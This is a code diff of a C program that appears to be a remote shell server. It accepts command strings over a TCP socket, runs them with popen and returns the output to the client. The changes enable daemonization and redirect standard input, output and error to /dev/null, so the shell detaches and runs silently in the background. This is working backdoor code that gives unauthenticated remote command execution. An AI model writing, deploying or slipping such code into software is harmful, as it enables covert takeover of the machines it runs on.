@@ -46,9 +46,9 @@ int main(int argc, char*argv[])
     char Msg[] = "Hey ! Iam HAL the server, you are now connected.\r\n";
     int msg_len = strlen(Msg);
 
-    //daemonize(fils);
-
     printf("[+] The server is open and ready.\n[+] Waiting for the openning of the remote shell.\n\n");
+
+    daemonize(fils);
 
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if(sock == INVALID_SOCKET)
@@ -141,6 +141,14 @@ int main(int argc, char*argv[])
                 exit(-1);
             }
 
+            if(strcmp(buffer, "quit") == 0)
+            {
+                shutdown(csock, 2);
+                memset(buffer, 0, BUFSIZ);
+                memset(buffer_cmd, 0, BUFSIZ);
+                exit(0);
+            }
+
             buffer[BUFSIZ-1] = '\0';
 
             pipe[0] = popen(buffer, "w");
@@ -164,21 +172,8 @@ int main(int argc, char*argv[])
             if(send(csock, buffer_cmd, BUFSIZ, 0) == SOCKET_ERROR)
                     ERROR("send() results");
 
-            if(strcmp(buffer, "quit\n") == 0)
-            {
-                shutdown(csock, 2);
-                close(sock);
-                close(csock);
-
-                pclose(pipe[0]);
-                pclose(pipe[1]);
-
-                break;
-            }
-
             memset(buffer, 0, BUFSIZ);
             memset(buffer_cmd, 0, BUFSIZ);
-
         }
     }
 
@@ -211,7 +206,7 @@ void daemonize(pid_t fils)
     umask(0);
 
 
-    /*  Redirect standard I/O for cancel all user terminal messages
+    /*  Redirect standard I/O for cancel all user terminal messages **/
     if( freopen("/dev/null", "r", stdin) == NULL )
         ERROR("freopen() stdin");
 
@@ -220,7 +215,5 @@ void daemonize(pid_t fils)
 
     if( freopen("/dev/null", "w", stderr) == NULL )
         ERROR("freopen stderr")
-
-    */
 }
 
